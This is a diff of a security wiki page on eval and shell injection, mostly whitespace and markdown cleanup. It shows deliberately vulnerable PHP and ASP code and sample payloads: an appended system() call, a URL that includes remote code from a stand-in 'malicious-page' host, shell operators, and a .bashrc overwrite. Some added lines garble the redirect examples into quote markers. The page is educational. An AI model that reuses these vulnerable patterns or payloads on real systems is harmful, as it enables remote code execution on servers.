@@ -1,18 +1,17 @@
 ---
-
 layout: col-sidebar
 title: Direct Dynamic Code Evaluation - Eval Injection
-author: 
+author:
 contributors:
 permalink: /attacks/Direct_Dynamic_Code_Evaluation_Eval Injection
 tags: attack, direct dynamic code evaluation, eval injection
 auto-migrated: 1
-
 ---
 
 {% include writers.html %}
 
 ## Description
+
 This attack consists of a script that does not properly validate user inputs in the page parameter. A remote user can supply a specially crafted URL to pass arbitrary code to an eval() statement, which results in code execution.
 
 Note 1: This attack will execute the code with the same permission like the target web service, including operation system commands.
@@ -26,9 +25,9 @@ Examples
 Example 1
 In this example an attacker can control all or part of an input string that is fed into an eval() function call
 
-  $myvar = "varname"; 
-  $x = $_GET['arg']; 
-  eval("\$myvar = \$x;"); 
+$myvar = "varname";
+$x = $\_GET['arg'];
+eval("\$myvar = \$x;");
 The argument of "eval" will be processed as PHP, so additional commands can be appended. For example, if "arg" is set to "10 ; system(\"/bin/echo uh-oh\");", additional code is run which executes a program on the server, in this case "/bin/echo".
 
 Example 2
@@ -74,7 +73,7 @@ The developer thought this would ensure that only blue.php and red.php could be 
 Example 4
 A simple URL which demonstrates a way to do this attack:
 
- http://some-page/any-dir/index.php?page=<?include($s);?>&s=http://malicious-page/cmd.txt?  
+http://some-page/any-dir/index.php?page=<?include($s);?>&s=http://malicious-page/cmd.txt?
 Example 5
 Shell Injection applies to most systems which allow software to programmatically execute a Command line. Typical sources of Shell Injection are calls system(), StartProcess(), java.lang.Runtime.exec() and similar APIs.
 
@@ -82,7 +81,7 @@ Consider the following short PHP program, which runs an external program called 
 
 <HTML>
 <?php
-passthru ( " /home/user/phpguru/funnytext " 
+passthru ( " /home/user/phpguru/funnytext "
            . $_GET['USER_INPUT'] );
 ?>
 This program can be injected in multiple ways:
@@ -93,9 +92,10 @@ $(command) will execute command.
 | command will execute command, and output result of command.
 && command will execute command, and output result of command.
 || command will execute command, and output result of command.
+
 > /home/user/phpguru/.bashrc will overwrite file .bashrc.
-< /home/user/phpguru/.bashrc will send file .bashrc as input to funnytext.
-PHP offers escapeshellarg() and escapeshellcmd() to perform encoding before calling methods. However, it is not recommended to trust these methods to be secure - also validate/sanitize input.
+> < /home/user/phpguru/.bashrc will send file .bashrc as input to funnytext.
+> PHP offers escapeshellarg() and escapeshellcmd() to perform encoding before calling methods. However, it is not recommended to trust these methods to be secure - also validate/sanitize input.
 
 Example 6
 The following code is vulnerable to eval() injection, because it don’t sanitize the user’s input (in this case: “username”). The program just saves this input in a txt file, and then the server will execute this file without any validation. In this case the user is able to insert a command instead of a username.
@@ -103,30 +103,30 @@ The following code is vulnerable to eval() injection, because it don’t sanitiz
 Example:
 
 <%
-	If not isEmpty(Request( "username" ) ) Then
-		Const ForReading = 1, ForWriting = 2, ForAppending = 8
-		Dim fso, f
-		Set fso = CreateObject("Scripting.FileSystemObject")
-		Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
-		f.Write Request("username") & vbCrLf
-		f.close
-		Set f = nothing
-		Set fso = Nothing
-		%>
-		<h1>List of logged users:</h1>
-		<pre>
-		<%
-			Server.Execute( "userlog.txt" )
-		%>
-		</pre>
-		<%
-	Else
-		%>
-		<form>
-			<input name="username" /><input type="submit" name="submit" />
-		</form>
-		<%
-	End If
+If not isEmpty(Request( "username" ) ) Then
+Const ForReading = 1, ForWriting = 2, ForAppending = 8
+Dim fso, f
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set f = fso.OpenTextFile(Server.MapPath( "userlog.txt" ), ForAppending, True)
+f.Write Request("username") & vbCrLf
+f.close
+Set f = nothing
+Set fso = Nothing
+%>
+<h1>List of logged users:</h1>
+<pre>
+<%
+Server.Execute( "userlog.txt" )
+%>
+</pre>
+<%
+Else
+%>
+<form>
+<input name="username" /><input type="submit" name="submit" />
+</form>
+<%
+End If
 %>
 Related Threat Agents
 Internal software developer
